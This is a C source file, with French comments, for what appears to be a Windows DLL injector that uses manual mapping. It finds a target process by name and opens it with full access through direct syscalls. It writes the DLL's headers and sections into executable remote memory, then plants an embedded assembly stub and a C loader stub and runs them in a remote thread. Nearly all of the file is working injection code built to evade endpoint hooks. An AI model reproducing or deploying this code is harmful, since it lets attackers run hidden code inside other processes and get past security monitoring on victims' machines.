#include "dll-injector/dll-injector.h"
#include "dll-injector/loader-stub.h"
#include "utils/peb-lookup.h"
#include "utils/syscalls.h"
#include "asm-stub-bin.h"
#include <stdio.h>

/**
 * @brief Affiche un message d'erreur formaté avec le code d'erreur système.
 *
 * @param msg Préfixe descriptif de l'opération ayant échoué.
 * @return Aucun.
 */
static void printError(const char* msg){
  DWORD errCode;
  char buffer[512];

  errCode = g_Api.pGetLastError();
  g_Api.pFormatMessageA(
    FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
    NULL,
    errCode,
    0,
    buffer,
    (DWORD)(sizeof(buffer) / sizeof(char)),
    NULL
  );
  fprintf(stderr, "%s failed with error %lu: %s\n", msg, errCode, buffer);
}

/**
 * @brief Parcourt la liste des processus actifs et retourne le PID correspondant
 *        au nom d'exécutable spécifié.
 *
 * @param exeFileName Nom de l'exécutable cible (ex. : "Notepad.exe").
 * @return PID du processus trouvé, ou 0 si introuvable.
 */
DWORD ProcessWalking(char* exeFileName){
  HANDLE hProcessSnap;
  PROCESSENTRY32 pe32;

  /* Capture instantanée de tous les processus en cours d'exécution. */
  hProcessSnap = g_Api.pCreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0 );
  if( hProcessSnap == INVALID_HANDLE_VALUE )
  {
    printError("CreateToolhelp32Snapshot (of processes)");
    return( FALSE );
  }

  pe32.dwSize = sizeof( PROCESSENTRY32 );

  if( !g_Api.pProcess32First( hProcessSnap, &pe32 ) )
  {
    printError("Process32First");
    g_Api.pCloseHandle( hProcessSnap );
    return( FALSE );
  }

  /* Itération sur les entrées du snapshot jusqu'à correspondance du nom. */
  do
  {
    if(strcmp(pe32.szExeFile, exeFileName) == 0){
      g_Api.pCloseHandle( hProcessSnap );
      return pe32.th32ProcessID;
    }
  } while(g_Api.pProcess32Next( hProcessSnap, &pe32 ));

  g_Api.pCloseHandle( hProcessSnap );
  return 0;
}

/**
 * @brief Mappe manuellement une DLL dans l'espace mémoire d'un processus cible.
 *
 * Alloue de la mémoire dans le processus distant et y écrit les en-têtes PE
 * ainsi que toutes les sections de la DLL.
 *
 * @param hProcess Handle du processus cible avec droits d'accès complets.
 * @param pe Pointeur vers la structure IMAGE_PE_FILE contenant les données brutes.
 * @return Adresse de base du tampon distant alloué, ou NULL en cas d'erreur.
 */
LPVOID MannualMappingDll(HANDLE hProcess, PIMAGE_PE_FILE pe){
  IMAGE_DOS_HEADER* dosHeader;
  IMAGE_NT_HEADERS* ntHeaders;
  PVOID pRemoteBuffer = NULL;
  int numberOfSections;
  IMAGE_SECTION_HEADER* sectionHeaders;
  NTSTATUS status;

  dosHeader = (IMAGE_DOS_HEADER*)pe->RawData;
  ntHeaders = (IMAGE_NT_HEADERS*)(pe->RawData + dosHeader->e_lfanew);

  /* Allocation de la mémoire distante pour l'image complète de la DLL.
   * pRemoteBuffer is already NULL — the kernel uses it as a hint (NULL = anywhere). */
  SIZE_T regionSize = (SIZE_T)ntHeaders->OptionalHeader.SizeOfImage;
  status = dAllocateVirtualMemory(
    hProcess,
    &pRemoteBuffer,
    0,
    &regionSize,
    MEM_COMMIT | MEM_RESERVE,
    PAGE_EXECUTE_READWRITE
  );
  if(status != 0){
    fprintf(stderr, "[-] dAllocateVirtualMemory (DLL image) failed: NTSTATUS 0x%08lX\n", (unsigned long)status);
    return NULL;
  }
  printf("[+] dAllocateVirtualMemory (DLL image) OK — base: %p, size: %llu\n", pRemoteBuffer, (unsigned long long)regionSize);

  /* Écriture des en-têtes PE dans le tampon distant. */
  SIZE_T bytesWritten = 0;
  status = dWriteVirtualMemory(hProcess, pRemoteBuffer, pe->RawData, ntHeaders->OptionalHeader.SizeOfHeaders, &bytesWritten);
  if(status != 0){
    fprintf(stderr, "[-] dWriteVirtualMemory (PE headers) failed: NTSTATUS 0x%08lX\n", (unsigned long)status);
    return NULL;
  }
  printf("[+] dWriteVirtualMemory (PE headers) OK — %llu bytes\n", (unsigned long long)bytesWritten);

  numberOfSections = ntHeaders->FileHeader.NumberOfSections;
  sectionHeaders = IMAGE_FIRST_SECTION(ntHeaders);

  /* Écriture de chaque section à son adresse virtuelle respective. */
  for(int i = 0; i < numberOfSections; i++){
    PVOID sectionDest = (PVOID)((BYTE*)pRemoteBuffer + sectionHeaders[i].VirtualAddress);
    bytesWritten = 0;
    status = dWriteVirtualMemory(
      hProcess,
      sectionDest,
      pe->RawData + sectionHeaders[i].PointerToRawData,
      sectionHeaders[i].SizeOfRawData,
      &bytesWritten
    );
    if(status != 0){
      fprintf(stderr, "[-] dWriteVirtualMemory (section %d) failed: NTSTATUS 0x%08lX\n", i, (unsigned long)status);
      return NULL;
    }
    printf("[+] dWriteVirtualMemory (section %d: %.8s) OK — %llu bytes\n",
           i, (char*)sectionHeaders[i].Name, (unsigned long long)bytesWritten);
  }

  return pRemoteBuffer;
}

/**
 * @brief Orchestre l'injection complète d'une DLL par manual mapping dans un processus cible.
 *
 * Ouvre le processus, lit et valide le fichier PE, mappe la DLL en mémoire distante,
 * puis injecte et exécute le stub de chargement via un thread distant.
 *
 * @param dwProcessId Identifiant du processus cible.
 * @param dllPath Chemin absolu vers le fichier DLL à injecter.
 * @param remoteBuffer Pointeur de sortie vers le tampon distant alloué (non utilisé en retour).
 * @return Handle du processus cible en cas de succès, ou NULL en cas d'erreur.
 */
HANDLE injectDll(DWORD dwProcessId, const char* dllPath, LPVOID* remoteBuffer){
  HANDLE hProcess = NULL;
  LPVOID pRemoteBuffer;
  PIMAGE_PE_FILE pe;
  PMANUAL_MAPPING_DATA pData;

  /* Open the target process via direct syscall.
   * memset both structures to zero before use — the kernel validates that
   * reserved/padding bytes are clean; uninitialized stack bytes cause STATUS_INVALID_PARAMETER. */
  OBJECT_ATTRIBUTES oa;
  memset(&oa, 0, sizeof(oa));
  oa.Length = sizeof(oa);

  CLIENT_ID cid;
  memset(&cid, 0, sizeof(cid));
  cid.UniqueProcess = (HANDLE)(ULONG_PTR)dwProcessId;

  NTSTATUS status = dOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &oa, &cid);
  if(status != 0){
    fprintf(stderr, "[-] dOpenProcess failed: NTSTATUS 0x%08lX\n", (unsigned long)status);
    return NULL;
  }

  pe = malloc(sizeof(IMAGE_PE_FILE));
  SetRawData(dllPath, pe);

  pRemoteBuffer = MannualMappingDll(hProcess, pe);
  if(pRemoteBuffer == NULL){
    g_Api.pCloseHandle(hProcess);
    return NULL;
  }

  pData = (PMANUAL_MAPPING_DATA)malloc(sizeof(MANUAL_MAPPING_DATA));
  pData->pBaseAddress = pRemoteBuffer;

  pData->pLoadLibraryA   = NULL; /* Résolu par le stub ASM dans le processus cible. */
  pData->pGetProcAddress = NULL; /* Résolu par le stub ASM dans le processus cible. */
  pData->pCStubAddress   = NULL; /* Fixé par injectManualMappingStub. */

  /* Le stub ASM est embarqué à la compilation via asm-stub-bin.h (généré par xxd -i). */
  BYTE *asmStubBuffer = asm_stub_bin;
  long asmStubSize = (long)asm_stub_bin_len;

  /* Calcul de la taille du stub C compilé en PIC. */
  DWORD cStubSize = (DWORD)((BYTE *)C_LoaderStub_End - (BYTE *)C_LoaderStub);

  HANDLE hThread = injectManualMappingStub(
      hProcess, pData,
      asmStubBuffer, (DWORD)asmStubSize,
      (LPVOID)C_LoaderStub, cStubSize);

  free(pData);
  free(pe->RawData);
  free(pe);

  if (hThread == NULL) {
    g_Api.pCloseHandle(hProcess);
    return NULL;
  }

  g_Api.pCloseHandle(hThread);
  return hProcess;
}

/**
 * @brief Injecte le stub ASM, le stub C et la structure de données dans le processus
 *        cible, puis crée un thread distant pour déclencher l'exécution.
 *
 * Alloue un unique bloc de mémoire exécutable contenant dans l'ordre :
 * le stub ASM (point d'entrée), le stub C, puis la structure MANUAL_MAPPING_DATA.
 *
 * @param hProcess Handle du processus cible.
 * @param pData Pointeur vers la structure MANUAL_MAPPING_DATA à transmettre au stub.
 * @param pAsmStub Pointeur local vers le bytecode du stub ASM.
 * @param asmStubSize Taille en octets du stub ASM.
 * @param pCStub Pointeur local vers le bytecode du stub C.
 * @param cStubSize Taille en octets du stub C.
 * @return Handle du thread distant créé, ou NULL en cas d'erreur.
 */
HANDLE injectManualMappingStub(HANDLE hProcess, PMANUAL_MAPPING_DATA pData, LPVOID pAsmStub, DWORD asmStubSize, LPVOID pCStub, DWORD cStubSize) {
    PVOID pRemoteMem = NULL;
    PVOID pRemoteAsmStub = NULL;
    PVOID pRemoteCStub = NULL;
    PVOID pRemoteData = NULL;
    HANDLE hThread = NULL;
    SIZE_T totalSize = asmStubSize + cStubSize + sizeof(MANUAL_MAPPING_DATA);
    SIZE_T regionSize = totalSize;
    SIZE_T bytesWritten = 0;
    NTSTATUS status;

    /* Allocation d'un bloc contigu : stub ASM | stub C | MANUAL_MAPPING_DATA.
     * pRemoteMem is already NULL — guarantees the kernel picks the address freely. */
    status = dAllocateVirtualMemory(hProcess, &pRemoteMem, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (status != 0) {
        fprintf(stderr, "[-] dAllocateVirtualMemory (stubs) failed: NTSTATUS 0x%08lX\n", (unsigned long)status);
        return NULL;
    }
    printf("[+] dAllocateVirtualMemory (stubs) OK — base: %p, size: %llu\n", pRemoteMem, (unsigned long long)regionSize);

    pRemoteAsmStub = pRemoteMem;
    pRemoteCStub = (PVOID)((BYTE*)pRemoteAsmStub + asmStubSize);
    pRemoteData = (PVOID)((BYTE*)pRemoteCStub + cStubSize);
    printf("[+] Layout — ASM: %p  C: %p  Data: %p\n", pRemoteAsmStub, pRemoteCStub, pRemoteData);

    /* Mise à jour de l'adresse distante du stub C dans la structure de données. */
    pData->pCStubAddress = pRemoteCStub;

    bytesWritten = 0;
    status = dWriteVirtualMemory(hProcess, pRemoteAsmStub, pAsmStub, asmStubSize, &bytesWritten);
    if (status != 0) {
        fprintf(stderr, "[-] dWriteVirtualMemory (ASM stub) failed: NTSTATUS 0x%08lX\n", (unsigned long)status);
        goto cleanup;
    }
    printf("[+] dWriteVirtualMemory (ASM stub) OK — %llu bytes\n", (unsigned long long)bytesWritten);

    bytesWritten = 0;
    status = dWriteVirtualMemory(hProcess, pRemoteCStub, pCStub, cStubSize, &bytesWritten);
    if (status != 0) {
        fprintf(stderr, "[-] dWriteVirtualMemory (C stub) failed: NTSTATUS 0x%08lX\n", (unsigned long)status);
        goto cleanup;
    }
    printf("[+] dWriteVirtualMemory (C stub) OK — %llu bytes\n", (unsigned long long)bytesWritten);

    bytesWritten = 0;
    status = dWriteVirtualMemory(hProcess, pRemoteData, pData, sizeof(MANUAL_MAPPING_DATA), &bytesWritten);
    if (status != 0) {
        fprintf(stderr, "[-] dWriteVirtualMemory (MappingData) failed: NTSTATUS 0x%08lX\n", (unsigned long)status);
        goto cleanup;
    }
    printf("[+] dWriteVirtualMemory (MappingData) OK — %llu bytes\n", (unsigned long long)bytesWritten);

    /* Création du thread distant — point d'entrée : stub ASM, argument : pRemoteData.
     * hThread is already NULL; ObjectAttributes NULL is valid for NtCreateThreadEx. */
    status = dCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, pRemoteAsmStub, pRemoteData, 0, 0, 0, 0, NULL);
    if (status != 0) {
        fprintf(stderr, "[-] dCreateThreadEx failed: NTSTATUS 0x%08lX\n", (unsigned long)status);
        goto cleanup;
    }
    printf("[+] dCreateThreadEx OK — thread handle: %p\n", hThread);

    return hThread;

cleanup:
    if (pRemoteMem) g_Api.pVirtualFreeEx(hProcess, pRemoteMem, 0, MEM_RELEASE);
    return NULL;
}
